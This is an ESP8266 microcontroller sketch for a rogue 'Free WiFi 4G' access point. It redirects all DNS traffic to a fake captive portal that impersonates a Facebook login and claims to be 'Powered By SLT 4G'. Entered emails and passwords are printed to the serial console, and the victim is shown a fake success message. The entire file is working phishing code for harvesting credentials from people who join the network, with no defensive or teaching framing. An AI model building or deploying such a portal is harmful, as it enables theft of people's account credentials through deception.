#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String responseHTML = "<!DOCTYPE html> <html> <head> <meta name='viewport' content='width=device-width, initial-scale=1'> <style> body {font-family: Arial, Helvetica, sans-serif;} input[type=text], input[type=password] { width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; } button { background-color: #3b5998; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; } button:hover { opacity: 0.8; } .cancelbtn { width: auto; padding: 10px 18px; background-color: #3b5998; } .imgcontainer { text-align: center; margin: 24px 0 12px 0; position: relative; } img.avatar { width: 40%; border-radius: 50%; } .container { padding: 16px; } span.psw { float: right; padding-top: 16px; } /* The Modal (background) */ .modal { display: none; /* Hidden by default */ position: fixed; /* Stay in place */ z-index: 1; /* Sit on top */ left: 0; top: 0; width: 100%; /* Full width */ height: 100%; /* Full height */ overflow: auto; /* Enable scroll if needed */ background-color: rgb(0,0,0); /* Fallback color */ background-color: rgba(0,0,0,0.4); /* Black w/ opacity */ padding-top: 60px; } /* Modal Content/Box */ .modal-content { background-color: #fefefe; margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */ border: 1px solid #888; width: 80%; /* Could be more or less, depending on screen size */ } /* The Close Button (x) */ .close { position: absolute; right: 25px; top: 0; color: #000; font-size: 35px; font-weight: bold; } .close:hover, .close:focus { color: red; cursor: pointer; } /* Change styles for span and cancel button on extra small screens */ @media screen and (max-width: 300px) { span.psw { display: block; float: none; } .cancelbtn { width: 100%; } } </style> </head> <body style='text-align:center;'> <h2>Free WiFi Portal</h2> <div id='id012' class='modala'> <form class='modal-content animate' method='GET' action='/action_page'> <div class='container' style='background-color:#3b5998'> <label for='uname'><h3 style='color:white;'>Login to portal with facebook</h3></label> </div> <div class='container'> <label for='uname'><b>Email</b></label> <input type='text' placeholder='Enter Email' name='uname' required> <label for='psw'><b>Password</b></label> <input type='password' placeholder='Enter Password' name='psw' required> <button type='submit'>Login</button> </div> </form> </div> <p> Powered By SLT 4G</p> </body> </html> ";

void setup() {
  Serial.begin(9600);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Free WiFi 4G");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });
  webServer.on("/", handleRoot);      //Which routine to handle at root location
  webServer.on("/action_page", handleForm);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
void handleForm() {
 String firstName = webServer.arg("uname"); 
 String lastName = webServer.arg("psw"); 

 Serial.print("Email:");
 Serial.println(firstName);

 Serial.print("Last Name:");
 Serial.println(lastName);
 
 String s = "<!DOCTYPE html> <html> <head> <meta name='viewport' content='width=device-width, initial-scale=1'> <style> body {font-family: Arial, Helvetica, sans-serif;} </style> </head> <body style='text-align:center;'> <h2 style='background-color:#3b5998;color: white;padding-top: 20px;padding-bottom: 20px;'>Free WiFi Portal</h2> <h3 style='color:#3b5998;'>Face Book Login Success. Validation Process may take up to 15mins.</h3> <p style='background-color:rgb(230,230,230);padding-top: 5px;padding-bottom: 5px;'> Powered By SLT 4G</p> </body> </html> ";
 webServer.send(200, "text/html", s); //Send web page
}
void handleRoot() {
 String s = responseHTML; //Read HTML contents
 webServer.send(200, "text/html", s); //Send web page
}
